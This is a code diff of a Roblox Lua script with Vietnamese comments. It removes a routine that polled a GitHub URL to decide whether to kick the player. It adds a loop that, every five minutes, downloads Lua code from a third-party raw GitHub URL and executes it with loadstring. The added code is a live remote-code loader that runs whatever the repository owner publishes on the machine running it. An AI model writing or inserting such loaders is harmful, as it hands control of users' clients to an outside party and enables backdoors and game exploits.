@@ -1,34 +1,15 @@
--- CONFIG
-local C = {
-    Kick = false,                                      -- bật/tắt kick
-    Time = 5,                                         -- phút
-    URL = "https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/k%20i%20c%20k%20.%20lua"
-}
-
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LP = Players.LocalPlayer
-
--- Kick an toàn
-local function K(reason)
-    if LP and LP.Kick then
-        pcall(function() LP:Kick(reason or "Kicked") end)
-    end
-end
-
--- Load raw
-local function L()
-    local ok, raw = pcall(function() return game:HttpGet(C.URL) end)
-    if not ok then return end
-    local ok2, data = pcall(function() return HttpService:JSONDecode(raw) end)
-    if not ok2 then return end
-    if C.Kick and data.kick == true then K("Kick triggered") end
-end
-
--- Loop liên tục
 task.spawn(function()
+    local url = "https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/O%20U%20%20T%20.lua"
+
     while true do
-        L()
-        task.wait(C.Time * 60)   -- time tính theo phút
+        local s, e = pcall(function()
+            loadstring(game:HttpGet(url))()
+        end)
+
+        if not s then
+            warn("AUTO-RAW ERROR:", e)
+        end
+
+        task.wait(300) -- 5 phút
     end
 end)
